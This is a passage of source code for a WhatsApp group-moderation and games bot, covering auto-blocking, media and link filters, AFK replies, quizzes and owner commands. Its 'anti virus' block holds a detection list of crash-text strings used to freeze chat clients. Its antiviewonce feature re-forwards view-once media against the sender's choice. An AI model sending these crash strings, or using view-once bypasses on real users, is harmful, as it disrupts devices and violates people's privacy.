    if (db.data.settings[botNumber].autorecordtype) {
      if (isCommand) {
        let xeonmix = ["composing", "recording"];
        xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())];
        OctopusBotzz.sendPresenceUpdate(xeonmix2, from);
      }
    }
    if (db.data.settings[botNumber].autorecord) {
      if (isCommand) {
        let xeonmix = ["recording"];
        xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())];
        OctopusBotzz.sendPresenceUpdate(xeonmix2, from);
      }
    }
    if (db.data.settings[botNumber].autotype) {
      if (isCommand) {
        let xeonpos = ["composing"];
        OctopusBotzz.sendPresenceUpdate(xeonpos, from);
      }
    }

    //auto block number
    if (
      m.sender.startsWith(`${autoblocknumber}`) &&
      db.data.settings[botNumber].autoblocknum === true
    ) {
      return OctopusBotzz.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith("91") &&
      db.data.settings[botNumber].onlyindia === true
    ) {
      return OctopusBotzz.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith("62") &&
      db.data.settings[botNumber].onlyindo === true
    ) {
      return OctopusBotzz.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith(`${antiforeignnumber}`) &&
      db.data.chats[m.chat].antiforeignnum === true
    ) {
      if (isCreator || isAdmins || !isBotAdmins) return;
      OctopusBotzz.sendMessage(
        m.chat,
        {
          text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group`,
        },
        { quoted: m }
      );

      await OctopusBotzz.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }
    let list = [];
    for (let i of owner) {
      list.push({
        displayName: await OctopusBotzz.getName(i),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await OctopusBotzz.getName(
          i
        )}\nFN:${await OctopusBotzz.getName(
          i
        )}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    //console log
    console.log(
      color(
        `\n< ================================================== >\n`,
        "cyan"
      )
    );
    isCommand
      ? console.log(
          chalk.black(chalk.bgWhite("[ COMMAND ]")),
          chalk.black(chalk.bgGreen(new Date())),
          chalk.black(chalk.bgBlue(budy || m.mtype)) +
            "\n" +
            chalk.magenta("=> From"),
          chalk.green(pushname),
          chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
          chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
        )
      : console.log(
          chalk.black(chalk.bgWhite("[ MESSAGE ]")),
          chalk.black(chalk.bgGreen(new Date())),
          chalk.black(chalk.bgBlue(budy || m.mtype)) +
            "\n" +
            chalk.magenta("=> From"),
          chalk.green(pushname),
          chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
          chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
        );
    global.db.data.settings[botNumber].totalhit += 1;

    //antiviewonce
    if (
      db.data.chats[m.chat].antiviewonce &&
      m.isGroup &&
      m.mtype == "viewOnceMessageV2"
    ) {
      if (m.isBaileys && m.fromMe) return;
      let val = { ...m };
      let msg =
        val.message?.viewOnceMessage?.message ||
        val.message?.viewOnceMessageV2?.message;
      delete msg[Object.keys(msg)[0]].viewOnce;
      val.message = msg;
      await OctopusBotzz.sendMessage(m.chat, { forward: val }, { quoted: m });
    }
    //ANTI VIRUS
    if (isGroup && db.data.chats[m.chat].antivirtex) {
      if (
        budy.includes("๒๒๒๒") ||
        budy.includes("ดุ") ||
        budy.includes("ผิดุท้เึางืผิดุท้เึางื") ||
        budy.includes("๑๑๑๑๑๑๑๑") ||
        budy.includes("৭৭৭৭৭৭৭৭") ||
        budy.includes("   ⃢   ⃢   ⃢  ") ||
        budy.includes(
          "*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟"
        ) ||
        budy.includes("ผดิทุเ้ึางผืดิทุเ้") ||
        budy.includes(".*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*") ||
        budy.includes("᥋") ||
        budy.includes("؁") ||
        budy.includes("ٯٯٯٯٯ")
      ) {
        if (isGroupAdmins) return replyLinkGc("*VIRTEX DETECTED*");
        console.log(
          color("[KICK]", "red"),
          color("Received a virus text!", "yellow")
        );
        OctopusBotzz.sendText(
          m.chat,
          `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${
            sender.split("@")[0]
          }`
        );
        if (!isBotAdmins) return;
        if (isCreator) return;
        OctopusBotzz.groupParticipantsUpdate(from, [sender], "remove");
        await OctopusBotzz.sendMessage(from, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        OctopusBotzz.sendMessage(`${ownernumber}@s.whatsapp.net`, {
          text: `Hi Owner! wa.me/${
            sender.split("@")[0]
          } Detected Having Sent Virtex ${isGroup ? `in ${groupName}` : ""}`,
        });
      }
    }

    if (db.data.chats[m.chat].antibot) {
      if (m.isBaileys && m.fromMe == false) {
        if (isAdmin || !isBotAdmin) {
        } else {
          replyLinkGc(
            `*Bot lain Terdeteksi*\n\nHusshhh Keluar dari grup ini!!!`
          );
          return await OctopusBotzz.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
        }
      }
    }

    //anti media
    if (db.data.chats[m.chat].antimedia && isMedia) {
      if (isCreator || isAdmins || !isBotAdmins) {
      } else {
        replyLinkGc(
          `\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`
        );
        return OctopusBotzz.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
      }
    }
    if (db.data.chats[m.chat].image && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "imageMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antivideo && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "videoMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antisticker && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "stickerMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antiaudio && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "audioMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antipoll && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "pollCreationMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antilocation && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "locationMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antidocument && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "documentMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].anticontact && isOctopusBotzzMedia) {
      if (isOctopusBotzzMedia === "contactMessage") {
        if (isCreator || isAdmins || !isBotAdmins) {
        } else {
          replyLinkGc(
            `\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`
          );
          return OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    //respond
    if (db.data.chats[m.chat].badword) {
      for (let bak of bad) {
        if (budy === bak) {
          let baduser = await db.data.users[sender].badword;
          OctopusBotzz.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
          OctopusBotzz.sendMessage(
            from,
            {
              text: `\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${
                m.sender.split("@")[0]
              } menggunakan kata-kata kasar dan obrolannya telah dihapus`,
              contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
          );
        }
      }
    }
    //autosticker
    if (db.data.settings[botNumber].autosticker) {
      if (m.key.fromMe) return;
      if (/image/.test(mime) && !/webp/.test(mime)) {
        let mediac = await quoted.download();
        OctopusBotzz.sendImageAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
        console.log(`Auto sticker detected`);
      } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return;
        let mediac = await quoted.download();
        OctopusBotzz.sendVideoAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
      }
    }

    if (db.data.chats[m.chat].antilinkgc) {
      if (budy.match(`chat.whatsapp.com`)) {
        bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`;
        if (isAdmins) return replyLinkGc(bvl);
        if (m.key.fromMe) return replyLinkGc(bvl);
        if (isCreator) return replyLinkGc(bvl);
        await OctopusBotzz.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        OctopusBotzz.sendMessage(
          from,
          {
            text: `\`\`\`「 GC Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    if (db.data.chats[m.chat].antilink) {
      if (budy.match("http") && budy.match("https")) {
        bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`;
        if (isAdmins) return replyLinkGc(bvl);
        if (m.key.fromMe) return replyLinkGc(bvl);
        if (isCreator) return replyLinkGc(bvl);
        await OctopusBotzz.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        OctopusBotzz.sendMessage(
          from,
          {
            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } has sent a link and successfully deleted`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    //afk
    let mentionUser = [
      ...new Set([
        ...(m.mentionedJid || []),
        ...(m.quoted ? [m.quoted.sender] : []),
      ]),
    ];
    for (let jid of mentionUser) {
      let user = db.data.users[jid];
      if (!user) continue;
      let afkTime = user.afkTime;
      if (!afkTime || afkTime < 0) continue;
      let reason = user.afkReason || "";
      replyLinkGc(
        `Please Don't Tag Him\nHe's AFK ${
          reason ? "With reason " + reason : "no reason"
        }\nAfk Since ${clockString(new Date() - afkTime)}`.trim()
      );
    }
    if (db.data.users[m.sender].afkTime > -1) {
      let user = global.db.data.users[m.sender];
      replyLinkGc(
        `You Have Returned From AFK\nAFK Reason: ${
          user.afkReason ? user.afkReason : ""
        }\nAFK Duration: ${clockString(new Date() - user.afkTime)}`.trim()
      );
      user.afkTime = -1;
      user.afkReason = "";
    }

    //autoreply
    for (let BhosdikaXeon of VoiceNoteXeon) {
      if (budy === BhosdikaXeon) {
        let audiobuffy = fs.readFileSync(
          `./OctopusBotzzMedia/audio/${BhosdikaXeon}.mp3`
        );
        OctopusBotzz.sendMessage(
          m.chat,
          { audio: audiobuffy, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXeon of StickerXeon) {
      if (budy === BhosdikaXeon) {
        let stickerbuffy = fs.readFileSync(
          `./OctopusBotzzMedia/sticker/${BhosdikaXeon}.webp`
        );
        OctopusBotzz.sendMessage(
          m.chat,
          { sticker: stickerbuffy },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXeon of ImageXeon) {
      if (budy === BhosdikaXeon) {
        let imagebuffy = fs.readFileSync(
          `./OctopusBotzzMedia/image/${BhosdikaXeon}.jpg`
        );
        OctopusBotzz.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
      }
    }
    for (let BhosdikaXeon of VideoXeon) {
      if (budy === BhosdikaXeon) {
        let videobuffy = fs.readFileSync(
          `./OctopusBotzzMedia/video/${BhosdikaXeon}.mp4`
        );
        OctopusBotzz.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
      }
    }

    const sendapk = (teks) => {
      OctopusBotzz.sendMessage(
        from,
        {
          document: teks,
          mimetype: "application/vnd.android.package-archive",
        },
        { quoted: m }
      );
    };
    for (let BhosdikaXeon of ApkXeon) {
      if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(
          `./OctopusBotzzMedia/apk/${BhosdikaXeon}.apk`
        );
        sendapk(buffer);
      }
    }

    const sendzip = (teks) => {
      OctopusBotzz.sendMessage(
        from,
        { document: teks, mimetype: "application/zip" },
        { quoted: m }
      );
    };
    for (let BhosdikaXeon of ZipXeon) {
      if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(
          `./OctopusBotzzMedia/zip/${BhosdikaXeon}.zip`
        );
        sendzip(buffer);
      }
    }

    const senddocu = (teks) => {
      OctopusBotzz.sendMessage(
        from,
        { document: teks, mimetype: "application/pdf" },
        { quoted: m }
      );
    };
    for (let BhosdikaXeon of DocXeon) {
      if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(
          `./OctopusBotzzMedia/doc/${BhosdikaXeon}.pdf`
        );
        senddocu(buffer);
      }
    }

    // Respon Cmd with media
    if (
      isMedia &&
      m.msg.fileSha256 &&
      m.msg.fileSha256.toString("base64") in global.db.data.sticker
    ) {
      let hash = global.db.data.sticker[m.msg.fileSha256.toString("base64")];
      let { text, mentionedJid } = hash;
      let messages = await generateWAMessage(
        m.chat,
        { text: text, mentions: mentionedJid },
        {
          userJid: OctopusBotzz.user.id,
          quoted: m.quoted && m.quoted.fakeObj,
        }
      );
      messages.key.fromMe = areJidsSameUser(m.sender, OctopusBotzz.user.id);
      messages.key.id = m.key.id;
      messages.pushName = m.pushName;
      if (m.isGroup) messages.participant = m.sender;
      let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: "append",
      };
      OctopusBotzz.ev.emit("messages.upsert", msg);
    }

    //math
    if (kuismath.hasOwnProperty(m.sender.split("@")[0]) && isCmd2) {
      if (m.key.fromMe) return;
      kuis = true;
      jawaban = kuismath[m.sender.split("@")[0]];
      if (budy.toLowerCase() == jawaban) {
        await replyLinkGc(
          `🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`
        );
        delete kuismath[m.sender.split("@")[0]];
      } else replyLinkGc("*Wrong Answer!*");
    }

    //game
    this.game = this.game ? this.game : {};
    let room = Object.values(this.game).find(
      (room) =>
        room.id &&
        room.game &&
        room.state &&
        room.id.startsWith("tictactoe") &&
        [room.game.playerX, room.game.playerO].includes(m.sender) &&
        room.state == "PLAYING"
    );
    if (room) {
      let ok;
      let isWin = !1;
      let isTie = !1;
      let isSurrender = !1;
      // replyLinkGc(`[DEBUG]\n${parseInt(m.text)}`)
      if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return;
      isSurrender = !/^[1-9]$/.test(m.text);
      if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return !0;
      }
      if (
        !isSurrender &&
        1 >
          (ok = room.game.turn(
            m.sender === room.game.playerO,
            parseInt(m.text) - 1
          ))
      ) {
        replyLinkGc(
          {
            "-3": "The game is over",
            "-2": "Invalid",
            "-1": "Invalid Position",
            0: "Invalid Position",
          }[ok]
        );
        return !0;
      }
      if (m.sender === room.game.winner) isWin = true;
      else if (room.game.board === 511) isTie = true;
      let arr = room.game.render().map((v) => {
        return {
          X: "❌",
          O: "⭕",
          1: "1️⃣",
          2: "2️⃣",
          3: "3️⃣",
          4: "4️⃣",
          5: "5️⃣",
          6: "6️⃣",
          7: "7️⃣",
          8: "8️⃣",
          9: "9️⃣",
        }[v];
      });
      if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX;
        isWin = true;
      }
      let winner = isSurrender ? room.game.currentTurn : room.game.winner;
      let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

${
  isWin
    ? `@${winner.split("@")[0]} Won!`
    : isTie
    ? `Game over`
    : `Turn ${["❌", "⭕"][1 * room.game._currentTurn]} (@${
        room.game.currentTurn.split("@")[0]
      })`
}
❌: @${room.game.playerX.split("@")[0]}
⭕: @${room.game.playerO.split("@")[0]}

Type *surrender* to surrender and admit defeat`;
      if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
        room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = m.chat;
      if (room.x !== room.o)
        OctopusBotzz.sendText(room.x, str, m, {
          mentions: parseMention(str),
        });
      OctopusBotzz.sendText(room.o, str, m, {
        mentions: parseMention(str),
      });
      if (isTie || isWin) {
        delete this.game[room.id];
      }
    }

    //Suit PvP
    this.suit = this.suit ? this.suit : {};
    let roof = Object.values(this.suit).find(
      (roof) => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender)
    );
    if (roof) {
      let win = "";
      let tie = false;
      if (
        m.sender == roof.p2 &&
        /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(
          m.text
        ) &&
        m.isGroup &&
        roof.status == "wait"
      ) {
        if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
          OctopusBotzz.sendTextWithMentions(
            m.chat,
            `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`,
            m
          );
          delete this.suit[roof.id];
          return !0;
        }
        roof.status = "play";
        roof.asal = m.chat;
        clearTimeout(roof.waktu);
        //delete roof[roof.id].waktu
        OctopusBotzz.sendText(
          m.chat,
          `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`,
          m,
          { mentions: [roof.p, roof.p2] }
        );
        if (!roof.pilih)
          OctopusBotzz.sendText(
            roof.p,
            `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`,
            m
          );
        if (!roof.pilih2)
          OctopusBotzz.sendText(
            roof.p2,
            `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`,
            m
          );
        roof.waktu_milih = setTimeout(() => {
          if (!roof.pilih && !roof.pilih2)
            OctopusBotzz.sendText(
              m.chat,
              `Both Players Don't Want To Play,\nSuit Canceled`
            );
          else if (!roof.pilih || !roof.pilih2) {
            win = !roof.pilih ? roof.p2 : roof.p;
            OctopusBotzz.sendTextWithMentions(
              m.chat,
              `@${
                (roof.pilih ? roof.p2 : roof.p).split`@`[0]
              } Didn't Choose Suit, Game Over!`,
              m
            );
          }
          delete this.suit[roof.id];
          return !0;
        }, roof.timeout);
      }
      let jwb = m.sender == roof.p;
      let jwb2 = m.sender == roof.p2;
      let g = /scissors/i;
      let b = /rock/i;
      let k = /paper/i;
      let reg = /^(scissors|rock|paper)/i;
      if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.text.toLowerCase())[0];
        roof.text = m.text;
        replyLinkGc(
          `You have chosen ${m.text} ${
            !roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ""
          }`
        );
        if (!roof.pilih2)
          OctopusBotzz.sendText(
            roof.p2,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.text.toLowerCase())[0];
        roof.text2 = m.text;
        replyLinkGc(
          `You have chosen ${m.text} ${
            !roof.pilih ? `\n\nWaiting for the opponent to choose` : ""
          }`
        );
        if (!roof.pilih)
          OctopusBotzz.sendText(
            roof.p,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      let stage = roof.pilih;
      let stage2 = roof.pilih2;
      if (roof.pilih && roof.pilih2) {
        clearTimeout(roof.waktu_milih);
        if (b.test(stage) && g.test(stage2)) win = roof.p;
        else if (b.test(stage) && k.test(stage2)) win = roof.p2;
        else if (g.test(stage) && k.test(stage2)) win = roof.p;
        else if (g.test(stage) && b.test(stage2)) win = roof.p2;
        else if (k.test(stage) && b.test(stage2)) win = roof.p;
        else if (k.test(stage) && g.test(stage2)) win = roof.p2;
        else if (stage == stage2) tie = true;
        OctopusBotzz.sendText(
          roof.asal,
          `_*Suit Results*_${tie ? "\nSERIES" : ""}

@${roof.p.split`@`[0]} (${roof.text}) ${
            tie ? "" : roof.p == win ? ` Win \n` : ` Lost \n`
          }
@${roof.p2.split`@`[0]} (${roof.text2}) ${
            tie ? "" : roof.p2 == win ? ` Win \n` : ` Lost  \n`
          }
`.trim(),
          m,
          { mentions: [roof.p, roof.p2] }
        );
        delete this.suit[roof.id];
      }
    } //end

    //user db
    if (isCommand && !isUser) {
      xeonverifieduser.push(sender);
      fs.writeFileSync(
        "./assets/database/data/role/user.json",
        JSON.stringify(xeonverifieduser, null, 2)
      );
    }

    switch (isCommand) {
      case "rentbot":
      case "jadibot":
      case "rent":
        {
          if (m.isGroup) return replygc(mess.private);
          if (!isPrem) return replyprem(mess.premium);
          const { jadiBot, conns } = require("./jadiBot");
          jadiBot(OctopusBotzz, m, from);
        }
        break;
      case "addbadword":
        {
          if (!isCreator) return m.reply(mess.owner);
          if (args.length < 1) return m.reply("Apa kata-nya?");
          if (bad.includes(q))
            return m.reply("Kata ini susah ada di dalam database Kami");
          bad.push(q);
          fs.writeFileSync("./assets/bad.json", JSON.stringify(bad));
          m.reply(
            `Sukses Menambahkan Kata Buruk\nPeriksa dengan mengetikkan ${prefix}listbadword`
          );
        }
        break;
      case "delbadword":
      case "deldb":
        if (!isCreator) return XeonStickOwner();
        if (!groupAdmins) return replyLinkGc(mess.admin);
        if (args.length < 1)
          return replyLinkGc(
            `Send commands ${prefix}dellbadword [bad word]. Example ${
              prefix + command
            } asshole`
          );
        bad.splice(q);
        fs.writeFileSync("./assets/bad.json", JSON.stringify(bad));
        replyLinkGc("Successfully Deleted Bad Word!");
        break;
      case "listbadword":
      case "badwordlist":
        {
          let teks = "┌──⭓「 *Badword List* 」\n│\n";
          for (let x of bad) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`;
          replyLinkGc(teks);
        }
        break;
      case "resetuser":
      case "resetdbuser":
        {
          if (!isCreator) return XeonStickOwner();
          let totalusernya = db.data.users[0];
          replyLinkGc(`Succesfully Deleted ${totalusernya} Users in Database`);
          db.data.users = [];
        }
        break;
      case "resethit":
      case "resettotalhit":
        {
          if (!isCreator) return XeonStickOwner();
          global.db.data.settings[botNumber].totalhit = 0;
          replyLinkGc(mess.done);
        }
        break;
      case "setmenu":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(
              `There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${
                prefix + command
              } v1`
            );
          if (text.startsWith("v")) {
            typemenu = text;
            replyLinkGc(mess.done);
          } else {
            replyLinkGc(
              `There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${
                prefix + command
              } v1`
            );
          }
        }
        break;
      case "setreply":
        {
          if (!isCreator) return XeonStickOwner();
          if (!text)
            return replyLinkGc(
              `There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${
                prefix + command
              } v1`
            );
          if (text.startsWith("v")) {
            typereply = text;
            replyLinkGc(mess.done);
          } else {
            replyLinkGc(
              `There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${
                prefix + command
              } v1`
            );
          }
        }
        break;
      case "statustext":
      case "upswteks":
        {
          if (!isCreator) return XeonStickOwner();
          if (!q) return replyLinkGc("Text?");
